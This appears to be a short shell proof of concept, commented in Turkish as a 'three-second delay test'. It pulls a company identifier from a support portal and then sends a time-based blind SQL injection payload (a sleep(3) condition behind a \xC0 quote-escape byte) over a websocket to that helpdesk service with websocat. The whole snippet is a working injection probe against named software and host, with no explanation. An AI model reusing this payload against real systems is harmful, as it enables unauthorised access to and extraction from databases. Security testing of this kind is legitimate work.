# 3 saniye gecikme testi
company=$(curl -k -s https://support.customer.de/get_portal_info|cut -d'=' -f2|tail -n1|cut -d';' -f1|tr -d '\n\r')
time echo -ne "1\n\n0\n\xC0';select if(1=1,sleep(3),0)-- -\n" | websocat -k wss://support.customer.de/nw --protocol "ingredi support desk customer thin" -H "X-Ns-Company: $company" --binary -n --max-messages-rev 10
